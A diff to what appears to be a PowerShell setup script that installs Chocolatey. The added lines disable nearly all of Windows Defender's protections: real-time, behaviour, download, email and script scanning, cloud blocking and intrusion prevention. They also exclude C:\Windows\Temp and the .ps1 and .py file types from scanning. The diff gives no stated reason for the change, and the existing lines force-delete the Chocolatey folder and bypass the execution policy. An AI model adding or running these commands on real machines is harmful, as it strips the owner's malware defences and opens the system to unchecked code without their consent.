@@ -1,3 +1,28 @@
+# Disables realtime monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disables scanning for downloaded files or attachments
+Set-MpPreference -DisableIOAVProtection $true
+
+# Disable behaviour monitoring
+Set-MPPreference -DisableBehaviourMonitoring $true
+
+# Make exclusion for a certain folder
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+
+# Disables cloud detection
+Set-MPPreference -DisableBlockAtFirstSeen $true
+
+# Disables scanning of .pst and other email formats
+Set-MPPreference -DisableEmailScanning $true
+
+# Disables script scanning during malware scans
+Set-MPPReference -DisableScriptScanning $true
+
+# Exclude files by extension
+Set-MpPreference -ExclusionExtension "ps1"
+Set-MpPreference -ExclusionExtension "py"
+powershell -command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
 Remove-Item C:\ProgramData\chocolatey -Recurse -Force
 # Install Choco
 Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
